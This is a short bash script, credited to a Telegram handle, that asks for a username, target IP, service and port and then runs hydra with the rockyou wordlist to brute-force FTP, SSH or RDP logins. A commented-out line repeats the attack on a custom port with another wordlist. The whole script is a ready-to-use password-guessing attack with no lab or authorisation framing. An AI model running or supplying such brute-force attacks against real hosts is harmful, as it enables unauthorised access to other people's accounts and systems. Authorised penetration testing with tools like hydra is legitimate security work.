#!/bin/bash

echo "#-------------------------------------------#"
echo "#-- by: @cryptobr - on Telegram ------------#"
echo "#-------------------------------------------#"

sleep 1

#Input data
echo "Entry with user"
read USER

echo "Entry with target IP"
read IPVIT

echo "Entry with service, (ex: ftp, ssh, rdp)"
read SERV

echo "Entry port service use: "
read PORT


#Attak with rockyou worldlist
hydra -v -l $USER -P /usr/share/wordlists/rockyou.txt.gz $IPVIT $SERV 

#With other port
#hydra -v -l $USER -P /usr/share/john/password.lst $IPVIT $SERV -s $PORT
